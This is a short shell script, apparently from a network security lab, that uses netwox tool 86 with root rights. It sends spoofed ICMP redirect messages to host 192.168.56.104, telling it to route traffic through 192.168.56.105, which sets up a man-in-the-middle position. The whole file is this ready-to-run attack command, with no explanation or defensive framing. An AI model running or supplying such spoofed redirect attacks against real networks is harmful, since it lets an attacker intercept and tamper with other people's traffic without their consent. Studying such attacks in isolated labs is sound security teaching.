#!/bin/sh

sudo netwox 86 -d "enp0s8" \
	--filter "src host 192.168.56.104" --gw "192.168.56.105" \
	--code 0 --spoofip "raw" --src-ip "192.168.56.105"
